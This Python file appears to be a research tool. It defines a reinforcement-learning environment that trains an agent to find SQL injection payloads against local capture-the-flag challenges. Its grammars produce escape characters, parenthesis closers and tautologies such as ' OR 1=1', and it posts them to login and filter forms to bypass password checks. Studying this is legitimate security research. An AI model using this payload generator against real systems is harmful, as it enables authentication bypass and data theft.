import logging
import os
import re
import time

import gymnasium as gym
import numpy as np
import requests
from dotenv import load_dotenv
from gymnasium import spaces
from nltk import CFG
from nltk.parse.generate import generate
from numpy._typing import ArrayLike
from requests import Response
from requests.adapters import HTTPAdapter
from stable_baselines3.common.monitor import Monitor
from urllib3 import Retry

# Load environment variables from .env file
load_dotenv()

NUM_CHALLENGES = int(os.getenv('NUM_CHALLENGES', 1))  # Default to 1 if not set

# Define CFG for identifying valid escape characters
sql_grammar_phase1 = """
S -> ESC COMMENT
ESC -> "'" | '"'
COMMENT -> "-- " | "# " | "/* "
"""

# Define CFG for identifying valid parentheses structure
sql_grammar_phase2 = """
S -> ESC_COMMENT | CLOSE_PAREN COMMENT
ESC_COMMENT -> COMMENT
CLOSE_PAREN -> ")" | "))" | ")))" | "))))" | "))))))"
COMMENT -> "-- " | "# " | "/* "
"""

# Define CFG for injecting SQL statements using identified parentheses structure
sql_grammar_phase3 = """
S -> CLAUSE
CLAUSE -> SIMPLE_CLAUSE | SIMPLE_CLAUSE OPERATION
SIMPLE_CLAUSE -> " OR 1=1" | " AND 1=1" | " OR 'a'='a'" | " AND 'a'='a'"
OPERATION -> " LIMIT 1 OFFSET " NUMBER | " ORDER BY " COLUMN
NUMBER -> "0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9"
COLUMN -> "1" | "2" | "3" | "4" | "5"
"""

cfg_phase1 = CFG.fromstring(sql_grammar_phase1)
cfg_phase2 = CFG.fromstring(sql_grammar_phase2)
cfg_phase3 = CFG.fromstring(sql_grammar_phase3)


class SQLiEnv(gym.Env):
    """
    Custom environment for SQL injection attacks using reinforcement learning.
    """

    def __init__(self):
        super(SQLiEnv, self).__init__()
        self.base_url = "http://localhost:5959/challenge/"
        self.current_challenge_id = 1
        self.last_payload = ""  # Store the last payload
        self.exploit_char_found = False  # Flag for finding exploit character
        self.exploit_char = ""  # Store the found exploit character
        self.valid_structure = False  # Flag to indicate if the valid structure is found
        self.found_parenthesis_structure = False  # Flag for finding the parenthesis structure
        self.parentheses_structure = ""  # Store the valid parenthesis structure
        self.step_count = 0  # Track the number of steps in the current episode
        self.max_steps_per_episode = 20000  # Maximum steps per episode
        self.visited_payloads = set()  # Track visited payloads for intrinsic reward

        # Define the action and observation spaces
        self.action_space = spaces.Box(low=0, high=1, shape=(25,), dtype=np.float32)
        self.observation_space = spaces.Box(low=0, high=1, shape=(4,), dtype=np.float32)
        # Observation space: [exploit_char_used, query_valid, data_found, flag_found]

        # Set up a session with retries
        self.session = requests.Session()
        retries = Retry(total=5, backoff_factor=0.1)
        self.session.mount("http://", HTTPAdapter(max_retries=retries))

    def generate_payload(self, phase: int, action: ArrayLike) -> str:
        """
        Generate the SQL injection payload based on the current phase and action.

        :param: phase: The current phase of the environment.
        :param: action: The action taken by the agent.
        :return: The generated SQL injection payload.
        """
        if phase == 1:
            grammar = cfg_phase1
            action_index = int(action[0] * (len(list(generate(grammar, n=10))) - 1))
            payload = ' '.join(list(generate(grammar, n=10))[action_index])
        elif phase == 2:
            grammar = cfg_phase2
            action_index = int(action[0] * (len(list(generate(grammar, n=10))) - 1))
            parenthesis_payload = ' '.join(list(generate(grammar, n=10))[action_index])
            if "ESC_COMMENT" in parenthesis_payload:
                payload = f"{self.exploit_char} {parenthesis_payload.split()[1]}"
            else:
                payload = f"{self.exploit_char}{parenthesis_payload}"
        else:
            grammar = cfg_phase3
            action_index = int(action[0] * (len(list(generate(grammar, n=10))) - 1))
            clause = ' '.join(list(generate(grammar, n=10))[action_index])
            # Extract parentheses and comment part from the stored parentheses_structure
            match = re.search(r"(\)+)\s*(--|#|/\*)", self.parentheses_structure)
            if match:
                parentheses = match.group(1)
                match.group(2).strip() + " "
                num_parentheses = len(parentheses)
                parts = clause.split()

                # Use actions to determine placement of parentheses
                group_parentheses = action[1] > 0.5
                if group_parentheses:
                    split_index = int(action[2] * len(parts))  # Choose a split index based on action
                    parts.insert(split_index, parentheses)  # Insert all parentheses at the chosen index
                else:
                    # Distribute parentheses based on action indices
                    split_indices = sorted([int(action[i + 2] * len(parts)) for i in range(num_parentheses)])
                    for i, index in enumerate(split_indices):
                        parts.insert(index + i, ')')  # Insert parentheses at chosen indices

                clause_with_parentheses = ' '.join(parts)
                payload = f"{self.exploit_char} {clause_with_parentheses}".strip()
            else:
                payload = f"{self.exploit_char} {clause}".strip()  # Default fallback

            # Append the comment at the end without escape character
            payload = f"{payload} {self.parentheses_structure.split()[-1].strip()}"

        return payload

    def step(self, action: ArrayLike) -> (ArrayLike, float, bool, bool, dict):
        """
        Execute one step in the environment.

        :param: action: The action taken by the agent.
        :return: A tuple containing the new state, reward, done flag, truncated flag, and info dictionary.
        """
        self.step_count += 1  # Increment step count

        # Phase 1: Find the escape character
        if not self.exploit_char_found:
            payload = self.generate_payload(phase=1, action=action)
        # Phase 2: Find the valid number of closing parentheses
        elif not self.found_parenthesis_structure:
            payload = self.generate_payload(phase=2, action=action)
        # Phase 3: Generate SQL injection payloads with identified structure
        else:
            payload = self.generate_payload(phase=3, action=action)

        self.last_payload = payload
        start_time = 0
        end_time = 0
        data = {}
        try:
            response_get = self.session.get(f"{self.base_url}{self.current_challenge_id}", timeout=30)
            if "Login" in response_get.text:
                data = {"username_payload": payload, "password_payload": ""}
            elif "Filter" in response_get.text:
                data = {"payload": payload}

            start_time = time.time()
            response = self.session.post(f"{self.base_url}{self.current_challenge_id}", data=data, timeout=30)
            end_time = time.time()

            state, reward, done, truncated = self.analyze_response(response.text, payload, response.status_code,
                                                                   response_get)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            logging.error(f"Connection failed: {e}")
            state, reward, done, truncated = np.zeros(self.observation_space.shape), -1000, False, False

        # Check if episode should be truncated due to reaching the max steps
        if self.step_count >= self.max_steps_per_episode:
            truncated = True

        info = {"response_time": end_time - start_time}

        return np.array(state), reward, done, truncated, info

    def reset(self, **kwargs) -> (ArrayLike, dict):
        """
        Reset the environment for a new episode.

        :return: A tuple containing the initial state and an empty dictionary.
        """
        self.exploit_char_found = False
        self.found_parenthesis_structure = False
        self.valid_structure = False
        self.exploit_char = ""
        self.parentheses_structure = ""
        self.step_count = 0  # Reset step count for new episode
        self.visited_payloads = set()  # Reset visited payloads
        if NUM_CHALLENGES > 1:
            self.current_challenge_id = (self.current_challenge_id % NUM_CHALLENGES) + 1
        self.session.get("http://localhost:5959/reset")
        initial_observation = np.zeros(self.observation_space.shape)  # Initialize the state properly
        return initial_observation, {}

    def analyze_response(self, response_text: str, payload: str, response_status: int, response_get: Response) -> (
            ArrayLike, float, bool, bool):
        """
        Analyze the response from the server to determine the new state and reward.

        :param: response_text: The response text from the server.
        :param: payload: The payload sent to the server.
        :param: response_status: The HTTP status code of the response.
        :param: response_get: The initial GET response.
        :return: A tuple containing the new state, reward, done flag, and truncated flag.
        """
        state, reward = self.set_flags(payload, response_text, response_status, response_get)
        done = all(state)
        truncated = False
        return state, reward, done, truncated

    def set_flags(self, payload: str, response_text: str, response_status: int, response_get: Response) -> (
            ArrayLike, float):
        """
        Set the flags for the current state based on the response from the server.

        :param: payload: The payload sent to the server.
        :param: response_text: The response text from the server.
        :param: response_status: The HTTP status code of the response.
        :param: response_get: The initial GET response.
        :return: A tuple containing the new state and reward.
        """
        flag_pattern = rf"flag_{self.current_challenge_id}\{{[^}}]+}}"
        space = [0, 0, 0, 0]
        # Observation space: [exploit_char_used, query_valid, data_found, flag_found]

        if self.exploit_char in payload or self.exploit_char * 2 in payload:
            space[0] = 1  # Exploit character used somewhere in the payload

        if response_status == 200:
            space[1] = 1  # Query is valid
            if not self.found_parenthesis_structure and self.exploit_char_found:
                self.found_parenthesis_structure = True
                self.parentheses_structure = payload  # Store the valid parenthesis structure
                print(f"Valid parenthesis structure found: {self.parentheses_structure}")

        # Successful bypass of the password check
        if (response_status == 200 and ("wrong" or "fail") not in response_text.lower()
                and len(response_text) != len(response_get.text)):
            space[2] = 1  # Data found

        if re.search(flag_pattern, response_text):
            space[2] = 1  # Data found
            space[3] = 1  # Flag found

        reward = self.set_reward(space, payload)
        return space, reward

    def set_reward(self, space: list[int], payload: str) -> int:
        """
        Set the reward for the current state based on the response from the server.

        :param: space: The current observation space.
        :param: payload: The payload sent to the server.
        :return: The reward for the current state.
        """
        reward = 0

        # Observation space: [exploit_char_used, query_valid, data_found, flag_found]

        if space[0] == 0:
            reward -= 1000  # Penalty for not using the exploit character (very bad)

        if space[1] == 0:
            if not self.exploit_char_found:
                reward -= 20  # Penalty for not finding the exploit character by crashing the server
                self.exploit_char_found = True
                self.exploit_char = payload[0]  # Set the first character as the escape character
                print(f"Exploit character found: {self.exploit_char}")
            else:
                reward -= 60  # Penalty for crashing the server if we already found the exploit character
                # (bad but ok because of the exploration)

        if space[2] == 0:
            reward -= 40  # Penalty for not finding any data (bad)

        if space[2] == 1 and space != [1, 1, 1, 1]:
            reward -= 15  # Small penalty for bypassing the password check but not the good one

        if space == [1, 1, 1, 1]:
            reward = -1  # High reward for finding the flag

        # Intrinsic reward for new payloads
        if payload not in self.visited_payloads:
            reward += 10  # Small intrinsic reward for trying new payloads
            self.visited_payloads.add(payload)

        return reward


env = Monitor(SQLiEnv(), "logs", allow_early_resets=True)
